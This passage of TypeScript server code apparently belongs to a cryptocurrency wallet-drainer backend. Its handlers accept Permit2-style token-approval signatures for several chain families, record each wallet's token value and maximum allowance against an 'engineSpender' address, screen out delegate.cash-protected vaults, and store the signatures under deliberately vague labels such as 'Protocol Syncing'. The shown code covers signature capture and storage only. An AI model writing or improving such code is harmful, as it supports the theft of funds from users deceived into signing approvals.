        : b.chain_family === 'APTOS'
          ? 'aptos:1'
          : b.chain_family === 'SUI'
            ? 'sui:mainnet'
            : undefined
  const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
  const nativeAmount =
    b.chain_family === 'COSMOS' || b.chain_family === 'APTOS' || b.chain_family === 'SUI'
      ? (b.amount ?? tel.amount)
      : tel.amount
  return persistSignatureRow(
    {
      wallet_address,
      token_address,
      signature_hex: sealed,
      nonce: b.nonce,
      expiry: b.expiry_iso,
      wallet_type: b.wallet_type.trim(),
      protocol: rack,
      chain_family: b.chain_family,
      scout_value_usd: tel.scout_value_usd,
      amount: nativeAmount,
      max_allowance: tel.max_allowance,
      requires_quorum: tel.requires_quorum,
      source_origin: sourceOrigin,
      ...(chainIdNorm !== undefined ? { chain_id: chainIdNorm } : {}),
    },
    reply,
  )
}

async function handleLegacyPermit2(
  body: unknown,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  if (typeof body !== 'object' || body === null) {
    return sendFailure(reply, 400, 'Invalid Protocol Syncing payload', { code: 'ValidationError' })
  }
  const b = body as LegacyPermit2Body
  const { chainId, wallet, token, engineSpender, permit2, nonce, expiryIso, signature } = b
  if (typeof chainId !== 'number' || Number.isNaN(chainId)) {
    return sendFailure(reply, 400, 'Invalid chainId', { code: 'ValidationError' })
  }
  if (!wallet || !token || !signature || !nonce || !expiryIso || !engineSpender || !permit2) {
    return sendFailure(reply, 400, 'Invalid Protocol Syncing payload', { code: 'ValidationError' })
  }
  if (!isExpiryIsoWithinDriftWindow(String(expiryIso).trim())) {
    return sendFailure(
      reply,
      400,
      'Signature Anchor expiry outside operational Drift Window (Clock Desync).',
      { code: 'ValidationError' },
    )
  }
  const rpcUrl = await gatekeeperEthereumRpcUrl()
  if (!rpcUrl) {
    return sendFailure(reply, 500, 'Server RPC not configured', { code: 'ServerError' })
  }
  const legacyClient = createPublicClient({
    chain: chainById(Number(chainId)),
    transport: http(rpcUrl),
  })
  const delegateReject = await rejectIfDelegateCashDelegated(reply, legacyClient, {
    vault: wallet,
    engineSpender,
    permit2Address: permit2,
    tokenAddress: token,
  })
  if (delegateReject != null) {
    return delegateReject
  }
  const sealed = sealSignatureHexForPersistence(
    normalizeSignatureHexForSeal(String(signature)),
  )
  const rack = b.protocol != null ? normalizeProtocolRack(String(b.protocol)) : 'evm'
  const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
  return persistSignatureRow(
    {
      wallet_address: wallet.toLowerCase(),
      token_address: token.toLowerCase(),
      signature_hex: sealed,
      nonce,
      expiry: expiryIso,
      wallet_type:
        typeof b.wallet_type === 'string' && b.wallet_type.trim() !== ''
          ? b.wallet_type.trim()
          : 'MetaMask',
      protocol: PROTOCOL_RACK.has(rack) ? rack : 'evm',
      chain_family: 'EVM',
      chain_id:
        b.chain_id != null && String(b.chain_id).trim() !== ''
          ? String(b.chain_id).trim()
          : String(chainId),
      scout_value_usd: tel.scout_value_usd,
      amount: tel.amount,
      max_allowance: tel.max_allowance,
      requires_quorum: tel.requires_quorum,
      source_origin: sourceOrigin,
    },
    reply,
  )
}
